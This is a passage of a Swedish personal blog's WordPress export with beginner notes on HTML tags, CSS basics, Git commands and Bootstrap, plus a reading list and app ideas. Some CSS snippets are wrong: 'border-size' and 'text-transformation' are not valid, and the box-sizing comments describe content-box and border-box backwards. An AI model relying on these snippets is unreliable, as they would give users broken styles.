Div används på liknande sätt som span, alltså när ett mer adekvat element inte finns (div bör ej användas för section, header, footer,article). Div, liksom span, betyder ingenting i sig själv, utan används för att kunna implementera något annat. Tagen används ofta för att gruppera ihop ett antal olika element för att dom en specifik stil. Exempel:

[code language="html"]

&lt;div class=&quot;container&quot;&gt;

&lt;h1&gt;rubrik&lt;/h1&gt;

&lt;p&gt;paragraf med text&lt;/p&gt;

&lt;/div&gt;

[/code]

<strong>Meta</strong>
Metataggen används för att förmedla information som är tänkt för maskiner, och inte människor. De vanligaste är: name, charset.
Så här ska det se ut:
[code language="html"]
&lt;!-- Beskrivning av hemsidan. Används i vissa fall av google --&gt;
&lt;meta name=&quot;description&quot; content=&quot;Här är en beskrivning av hemsidan&quot; /&gt;

&lt;!-- Används för att förmedla vilken character encoding hemsidan använder --&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;

&lt;!-- Nyckelord. Används ej längre av google, men av Baidu. --&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;nyckelord, för, sökmotorer&quot; /&gt;

[/code]
För mer om hur google förhåller sig till metatags klicka <a href="https://support.google.com/webmasters/answer/79812?hl=en">här</a>. Om du sida riktar sig till kinesiska besökare så kan det fylla en funktion att använda keywords. Den största sökmotorn i kina, Baidu, använder sig nämligen av det. Mer om det <a href="http://searchengineland.com/the-b2b-marketers-guide-to-baidu-seo-180658">här</a>.



<strong> Span</strong>

Span används inom text. Om du till exempel vill ge ett specifikt ord i en mening en viss klass så kan du göra det genom att använda span. Exempel:

[code language="html"]

&lt;p&gt; Här är en helt vanlig mening.
Där ett specifikt ord får en egen klass med hjälp av span.
Här &lt;span class=&quot;unikt-ord&quot;&gt;är&lt;/span&gt; meningen.&lt;/p&gt;

[/code]

Span bör dock endast användas om det inte finns en bättre tag att använda.

<h2>Citat</h2>

[code lang="html"]
&lt;blockquote&gt;Detta är ett blockcitat&lt;/blockquote&gt;
&lt;q&gt;Detta är ett litet citat&lt;/q&gt;
&lt;ins&gt;Understrycker ett ord&lt;/ins&gt;
&lt;del&gt;Drar ett streck genom ordet&lt;/del&gt;
[/code]
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1639</wp:post_id>
		<wp:post_date>2015-05-13 16:00:10</wp:post_date>
		<wp:post_date_gmt>2015-05-13 16:00:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>html-taggar</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10964770740]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[210]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[210]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Böcker jag har läst</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/13/bocker-jag-har-last/</link>
		<pubDate>Wed, 13 May 2015 20:47:03 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=221</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>Slaughtherhouse five</strong> - Kurt Vonnegut
<strong>HTML and CSS Design and Build Websites</strong> - Jon Duckett
<strong>The Martian</strong> - Underhållande. 2015-09-02
<strong>Americanah</strong> - Chimamanda Ngozi Adichie. 2015 - 08 -24. Helt okej. Lite störande karaktärer. En hel del öppna dörrar som slås in.

<strong>How google works</strong> - 2015-07-27 Plågsamt, så plågsamt. Fruktansvärd uppläsning, som om varje mening skulle innehålla någon fantastisk sanning. Grundidén är typ: vi gör saker lite annorlunda. Å ordet smart creatives är med på varje sida.

<strong>Expeditionen - Min kärlekshistoria - Bea Uusma</strong> - Fin, intressant. Cool.


<strong>No Place to Hide - Gleen Greenwald</strong> - Väldigt bra.

<strong>Eat and run - Scott Jurek</strong>. Många bra historier. Inspirerande. Lite aggressiv uppläsare. Helt klart underhållande.

<strong>Alan Turing - The Enigma</strong> - Andrew Hodges. Genomgående. Tekniskt noggrann. Lite väl lång. Respektfull. Läsvärd.
<strong>The Power of Habit</strong> - Charles Duhigg - underhållande. Malcolm Gladwell-stilen.

<h2>Böcker som vore kul att läsa </h2>
Ultramarathon Man - Dean Karnazes]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1640</wp:post_id>
		<wp:post_date>2015-05-13 20:47:03</wp:post_date>
		<wp:post_date_gmt>2015-05-13 20:47:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>bocker-jag-har-last</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="bocker"><![CDATA[böcker]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11006667796]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[221]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[221]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Grundläggande CSS-attribut</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/17/grundlaggande-css-attribut/</link>
		<pubDate>Sun, 17 May 2015 14:21:56 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=261</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>CSS - Cascading Stylesheet</h2>
Det finns en anledning till att det heter cascading. Det är för att det går uppifrån och ner. Dokumentet läses alltså uppifrån och ner.
Klasser överskriver taggar. Och ID överskriver klasser. Och Inline-styling överskriver ID.
Klasser överskrider varandra om de ligger längre ner i dokumentet. Det är alltså klasserna längre ner som överskriver övriga klasser. Men ID kan ligga var som helst i dokumentet och det överskriver ändå klasser.
Något som överskrider alla andra taggar, klasser, ID, Inline-style är !important.

Så kom ihåg. klasser längre ner i dokumentet överskrider klasser längre upp.

<strong>Taggar. p, h1, header</strong>
<strong>Klasser - skriver över taggar</strong>
<strong>ID - skriver över klasser</strong>
<strong>Inline-style style="" - skriver över ID</strong>
<strong>!important - skriver över inline-style</strong>

Lista och förklaring på de viktigaste CSS-attributen.
<h2>Manipulera text</h2>
Det finns många sätt att manipulera text.

[code lang="css"]
text-transformation: uppercase; /*Gör om bokstäverna till stora bokstäver.*/

[/code]

<h2>Position</h2>
Här är en <a href="http://alistapart.com/article/css-positioning-101">fenomenal artikel</a> som förklarar de fyra olika modellerna.
Attributet position har fyra olika alternativ.
<code>
position: static; //Default inställningen. Den mest grundläggande.
position: relative;
position: fixed; //Fixerad på viewporten.
position: absolute; //Absolut i förhållande till sidan.
</code>

<strong>position: static; </strong>
Den mest grundläggande positionen. Den kan bara lägga block på varandra. Ställa divvar ovanpå varandra.Du kan inte använda några top, bottom, left, right-attribut här inte.

<strong>position: relative; </strong>
Den fungerar lika bra som static med att bara stapla boxarna. Men, den har speciellt krafter. Det kan även kombineras med left, right, top, bottom.
Exempel:
<code>
position: relative;
left: 200px;
</code>
I detta exempel så kommer boxen att röra sig 200px från vänster. Det betyder alltså 200px från vänsterkanten mot högerkanten. Om du skulle lägga till left: 200px; i en statisk så skulle ingenting hända.

<strong>position: absolute; </strong>

<strong>position: fixed; </strong>

<strong>Boxmodellen</strong>
<a href="http://www.w3schools.com/css/css_boxmodel.asp">Boxmodellen</a> bör alla känna till. Varje DIV består av en margin, border, padding, content.
Margin är området utanför border.
Border är linjen som går runt objektet.
Padding är området mellan content och border.
Content är själva innehållet, t.ex. en text eller en bild.

Här är ett exempel

[code language="css"]
div {
margin: 0px;
border: 5px solid black; /*5px tjock, solid och färgen svart */
padding: 20px 10px 100px 50px; /*EN för varje sida */
}
[/code]

Om du lägger til fyran värden till attributed padding så definerar du varje sida.

<strong>Box-sizing</strong>
Ett väldigt bra attribut att känna till är box-sizing. Det kan vara väldigt förvirrande att arbeta med boxar. Även om man sätter 100% så innebär det inte alltid 100%, och 100px är oftast inte 100px, utan extra beroende på border, och padding. Men om man skapar box-sixing attributet så betyder height och width precis det som man skriver. Height är alltså 100px och varken mer eller mindre. Kom ihåg dock att margin inte räknas in! Men kom ihåg att attributet är relativt nytt och inte fullt implementerat, så glöm inte browserspecifika attributen.

[code language="css"]
* {
-webkit-box-sizing: border-size;
-moz-box-sizing: border-size;
-ms-box-sizing: border-size;

box-sizing: border-size;
}
[/code]

<strong>Browserspecifika attribut</strong>
Browserspecifika attribut är attribut som är specifika för vissa browsers. För attribut som inte är fullt implementerade, där det inte råder någon exakt definition av hur attributet ska implementeras i browser används dessa browserspecifika attribut. Det är ett sätt att säga: Så här vill FireFox implementera det, så här vill Chrome implementera det.
<strong>-webkit</strong> - Safari och Chrome
<strong>-moz</strong> - <strong>Moz</strong>illa Firefox
<strong>-ms</strong> - Internet Explorer
<strong>-o</strong> - Opera

För att veta om det är säkert att använda ett visst attribut kolla <a href="http://caniuse.com">Can I Use</a>. Ett exempel är attributet box-sizing: border-box;

<strong>Definera alla element i css</strong>
Något som kan vara effektivt ibland är att tillfoga alla element ett visst attribut. Till exempel om man håller på å bygger upp en struktur och vill att alla element ska ha en border-attribut då kan man göra det såhär.

[code language="css"]
* {
    border: 1px solid red;
}
[/code]

Stjärnan i början indikerar att alla element på sidan får det attributet. En annan användbar situation är följande.

[code language="css"]
* {
    box-sizing: border-box;
}
[/code]

Om du vill att alla boxar ska ha box-sixing attributet, som jag skrev om ovan, så kan stjärnan också vara användbar. Glöm inte de browserspecifika attributen.

<strong>Media Quieres</strong>
Ett av de viktigaste attributen för att göra en hemsida responsiv är med hjälp av media quieres. Det ser ut såhär:

<strong>@media</strong>

[code language="css"]
@media only screen and (max-width: 300px) {
    p {
        background-color: blue;
    }
}
[/code]

Här ser vi ett exempel på en media querie. ordet <strong>only</strong> hjälper oss med äldre webbläsare. ordet <strong>screen</strong> betyder att media querien gäller alla slags skärmar, paddor, telefoner eller laptops. Du kan även använda ordet <strong>print</strong> för att göra om hemsidan till utskriftsformat. <strong>and</strong> är nödvändig för att binda ihop kommandona.
<strong>(max-width: 300px)</strong> betyder att reglerna kommer endast gälla för skärmar som är mindre än 300px.

&nbsp;

<h2>Width: 100%</h2>

Om man sätter width 100%, och sedan sätter padding eller margin så kommer boxen att vara större än 100% vilket ju är störande. Så för att lösa det kan man lägga till css attributet:

[code lang="css"]
div {
box-sizing: content-box; /*Detta gör att margin och padding räknas in i 100%*/
box-sizing: border-box; /*Detta gör att margin och padding inte räknas in*/
}
[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1641</wp:post_id>
		<wp:post_date>2015-05-17 14:21:56</wp:post_date>
		<wp:post_date_gmt>2015-05-17 14:21:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>grundlaggande-css-attribut</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13922412509]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[261]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[261]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Grunderna i Git</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/18/grunderna-i-git/</link>
		<pubDate>Mon, 18 May 2015 22:30:27 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=268</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Grundläggande Git-kunskap</h2>
Git är väldigt enkelt när man väl förstått grunderna i det. Låt oss säga att du har skrivit ihop en hemsida. Men du har börjat tröttna på att tappa kontrollen över alla ändringarna du har gjort. För att få kontroll över alla ändringar du gör i dina dokument kan lägga in dokumenten i en repository (repo). Så, låt oss säga att du har en mapp som heter hemsida, och i den mappen har du flera undermappar och dokument.
För att kunna lägga in alla dokumenten i en repository måste du först skapa en repository. Det gör du genom att gå in i mappen ~/hemsida och därefter skriva in kommandot
<strong>git init</strong>
Därmed har du skapat ett repository. Du har samtidigt skapat en mapp som hetet .git som innehåller olika konfigurationsfiler. Om du vill ta bort reposet så är det bara att ta bort .git-mappen (rm -rf .git).

Så nu har du skapat ett repo, men än så länge finns inga filer i reposet. Det kan du se om du skriver in kommandot:
<strong>git status</strong>
Då får du en lista på untracked files. ALltså filer som finns i mappen men som inte versionshanteras av git. Eftersom det är precis vad du vill att git ska göra så kan du lägga till filerna. Det gör du med kommandot:
<strong>git add filnamn</strong>
Om du har många filer och vill lägga till alla filer och mappar så använd kommandot:
<strong>git add .</strong>
Om du nu skriver git status så ser du en lista på alla filer som har lagts till. Filerna ligger i reposet men nu måste du commita dom. Att commita betyder helt enkelt att du säger "Nu har jag gjort en ändring i den här filen". Commita gör du genom att skriva kommandot:
<strong>git commit -m "Kommentar på vad det är du har ändrat"</strong>
Om du utelämnar -m så hamnar du i ett vim-dokument där du kan skriva längre och mer avancerade kommentarer. För mer om vim-kommandon se <a href="https://narcotize.wordpress.com/2015/04/14/vivim-kommandon/">här</a>.
Så, låt oss säga att du har lagt till lite kod i index.html, för att lägga till det i reposet måste du först lägga till filen, alltså:
<strong>git add index.html</strong>
Därefter kan du commita. Glöm inte att skriva ut tydliga och välformulerade commit-kommentarer, så att du själv minns varför du gjort en visst commit.

Låt oss säga att du fuckar upp det i index.html och ångrar några ändringar du har gjort. Då vill du se dina senaste ändringar. Använd då kommandot:
<strong>git log</strong>
Om du vill få en GUI-översikt så använd istället GitHub for Mac eller något annat GUI som passar dig.

En väldigt bra funktion i Git är förgreningen. För att starta en ny gren använder du kommandot:
<strong>git branch namnpånygren</strong>
för att sedan gå över till den grejen använd kommandot:
<strong>git checkout namnpågren</strong>
Om du sedan ändrar och commitar i grenen så finns den ändringen bara i grenene. Om du sedan går tillbaka till masterversionen genom kommandot
<strong>git checkout master</strong>
så kommer du att inga förändringar har skett i masterdokumenter.

Om du sen gör förändringar i den nya branchen och sedan vill merge brancherna när du är klar. Gå till master-branchen och kör:

<strong>git merge namnPåBranch</strong>

Sedan addar och commitar och pushar du.

Skapa en ny remote branch och pusha till den:
skapa en ny branch och commita till den:
<strong>git checkout -b test</strong>
Pusha till en ny remote branch
<strong>git push origin test</strong>


Ta bort lokal och remote branch.
<strong>git branch -d the_local_branch</strong>
<strong>git push origin - -delete the_remote_branch</strong>
<h2>Lista på kommandon</h2>
För att skapa ett nytt gitprojekt (repository - repo) skriver du bara
<strong>git init namnpåprojekt</strong>
Eller så skapar du en mapp och går in i den och skriver sedan: <strong>git init</strong>

För att se status över reposet
<strong>git status</strong>

Lägga till filer i reposet
<strong>git add filnamn</strong>

Lägga till alla filer i reposet
<strong>git add .</strong>

Ta bort en fil från reposet
<strong>git rm --cached index.html</strong>. Filen tas då inte bort från datorn utan bara från reposet, git kommer alltså inte att följa filens förändringar.

<strong>.gitignore</strong>
Du kan skapa en fil som heter .gitignore och i filen sedan lista alla filer och mappar som du inte vill att git ska tracka. Exempel på dessa är till exempel:
data - om du har en databas
node_modules

Om du råkar tracka dom, och sedan ångrar dig och vill ta bort dom från reposet så kör:
<strong>git rm [-r om det är en mapp] --cached data</strong>

Att ladda ner/kopiera ett visst projekt från github. Använd kommandot clone. Exempel:
<strong>git clone https://github.com/användarnamn/projektnamn</strong>

Visa logs över tidigare commits och dess ändringar:
<strong>git log</strong>
Detta visar tidigare commits
<strong>git log -p</strong>
Detta visar tidigare commits och exakt vilka ändringar som gjorts
<strong>git log -p 2</strong>
Visar commits och ändringar i de senaste två commitsen

En genväg för att skapa en branch å gå till den.
För att göra detta:
git branch iss53
git checkout iss53

Kan man göra:
git checkout -b iss53

Få tillgång till remote git-repos.
Dom är av någon konstig anledning typ dolda. Så man måste köra:
<strong>git branch -a</strong>
eller
<strong>git branch --all</strong>
För att kunna se dom.
Du kan titta på de osynliga brancherna genom:
<strong>git checkout origin/orig.org</strong>
Men för att arbeta på någon av dom så måste du skapa en lokal branch av den remota, det gör man genom följande kommando: 
<strong>git checkout -b orig.org origin/orig.org</strong>

<h2>Lägga upp till remote git-repo</h2>
Det finns två sätt att connecta med ett remote repo.
<strong>Sätt nr 1</strong>
1. Det enklaste sättet är att först gå in på github.com å skapa ett repo. Kom ihåg att lägga till en readme.md-fil. Det är nödvändigt för att du ska kunna klona reposet.

2. Gå in i terminalen och skriv <strong>git clone https://github.com/xapax/Voting.git</strong> eller vad nu adressen till reposet är.

3. Nu har du klonat reposet och det finns på din dator. Om du nu gör några ändringar som du sedan addar och commitar så måste du skicka dom ändringarna till till remote-repo. Det gör du genom följande kommando:
<strong>git push origin master</strong>
Kommandot push tar två parametrar, den första, origin, är remote reposet och det andra, master, är den lokala grenen som du vill pusha.

<strong>Sätt nr 2</strong>
<strong>mdkir mitt-repo
cd mitt-repo
git init
vim readme.md</strong> - Skriv in något i filen
<strong>git add .
git commit -m "Meddelande"</strong>

Skapa ett repo på github.com med exakt samma namn. Lägg inte till nån readme eller annan fil.

<strong>git remote add origin https://github.com/xapax/namn-på-dit-git-repo.git</strong>
<strong>git push -u origin master</strong>
<h2>Lägga upp på github.com och göra en egen sida för koden</h2>
1. Gå in på github.com och skapa ett nytt repo.

2. Gå in i den mapp du har dina filer i. Kontrollera noga så att det inte redan finns ett repo i mappen. Kontrollera att det inte finns någon .git-fil. Det kan du göra med ls -la.

Därefter startar du ett repo på din dator. I mappen med filerna skriver du
<strong>git init</strong>
<strong>git checkout --orphan gh-pages</strong> Skapar en ny gren och byter samtidigt över till den.
<strong>git add .</strong> Då lägger du till alla filerna.
<strong>git commit -m "First commit"</strong> Så committar du alla filerna.
<strong>git push origin gh-pages</strong> Nu har du pushat upp alla filerna och appen bör finnas på adressen https://username.github.io/namnpårepo
<h2>Hålla gh-pages och master i sync</h2>
Det är lite krånligt att hålla gh-pages och master i sync. Git är rätt så störande på det sättet.

Det här är det bästa sättet som jag har hittat.
Efter att du gjort ändringar i master-branchen går du in i gh-pages branchen och skriver:
git merge -X ours master
Så mergear och skriver över allting i gh-pages. Så var försiktig.
Sen behöver du inte ens adda å committa, det är bara att pusha å så är det klart.

Här är en del bra länkar.

Hur man skapar <a href="https://help.github.com/articles/creating-project-pages-manually/">gh-pages manuellt</a>.
<a href="http://classic.scottr.org/presentations/git-in-5-minutes/">http://classic.scottr.org/presentations/git-in-5-minutes/</a>
<h1>Git workflow</h1>
Här är en riktigt bra beskrivning av hur ett bra workflow med git ska se ut.
https://guides.github.com/introduction/flow/index.html]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1642</wp:post_id>
		<wp:post_date>2015-05-18 22:30:27</wp:post_date>
		<wp:post_date_gmt>2015-05-18 22:30:27</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>grunderna-i-git</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="git"><![CDATA[git]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13628202139]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[268]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[268]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_145e5c286688b309ab051a3c4dc22e09</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_585a6c50f6753b2342ab4b40d3a3bd36</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Språkquiz-plugin</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/19/sprakquiz-plugin/</link>
		<pubDate>Tue, 19 May 2015 15:58:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=278</guid>
		<description></description>
		<content:encoded><![CDATA[En intressant sätt att träna på språk vore att göra en browser-plugin som gjorde att varje gång man ville logga in, eller besöka, en viss sida (som man besöker hyffsat regelbundet) så måste man först svara rätt på tre quizfrågor. Alltså, för att komma in på DN eller gmail så måste man korrekt översätta tre spanskaord.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1643</wp:post_id>
		<wp:post_date>2015-05-19 15:58:00</wp:post_date>
		<wp:post_date_gmt>2015-05-19 15:58:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>sprakquiz-plugin</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<category domain="post_tag" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[278]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[278]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Visualisering av gruppers relationer till varandra</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/19/visualisering-av-gruppers-relationer-till-varandra/</link>
		<pubDate>Tue, 19 May 2015 16:12:11 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=281</guid>
		<description></description>
		<content:encoded><![CDATA[Detta är givetvis inget nytt. Men jag skulle gärna se en slags karta över t.ex. relationerna mellan de intelektuella i europa under 1900-talet. Hur Wittgenstain, Russel, Turing, Bunuel, Lorca, Dali hänger ihop.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1644</wp:post_id>
		<wp:post_date>2015-05-19 16:12:11</wp:post_date>
		<wp:post_date_gmt>2015-05-19 16:12:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>visualisering-av-gruppers-relationer-till-varandra</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[281]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[281]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Boostrap</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/19/boostrap/</link>
		<pubDate>Tue, 19 May 2015 19:15:06 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=286</guid>
		<description></description>
		<content:encoded><![CDATA[Bootstrap är det mest populära web-utvecklingsframverket. Bootstrap 3 är ett mobile-first-ramverk.

En effekt av att det är mobile-first är dess gridsystem. I gridsystemet så räknar man från minsta device. Se följande exempel:

[code language="html"]
&lt;div class=&quot;row&quot;&gt;
&lt;div class=&quot;col-xs-12&quot;&gt;
&lt;p&gt;Här är en kolumn per rad&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;col-xs-12&quot;&gt;
&lt;p&gt;Här är en till rad&lt;/p&gt;
&lt;/div&gt;
[/code]
